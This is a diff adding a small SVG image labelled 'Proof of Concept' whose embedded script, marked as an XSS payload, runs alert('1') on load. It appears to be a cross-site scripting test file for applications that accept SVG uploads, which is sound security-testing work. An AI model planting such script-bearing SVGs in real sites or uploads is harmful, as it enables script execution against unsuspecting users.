@@ -1,0 +1,13 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200" viewBox="0 0 200 200">
+    <!-- Visual SVG -->
+    <rect width="200" height="200" fill="#3498db" />
+
+    <!-- Text in the center -->
+    <text x="50%" y="50%" font-size="20" text-anchor="middle" dy=".3em" fill="white">Proof of Concept</text>
+
+    <!-- XSS Payload: Execute alert on load -->
+    <script type="text/javascript">
+        alert("1");
+    </script>
+</svg>
+
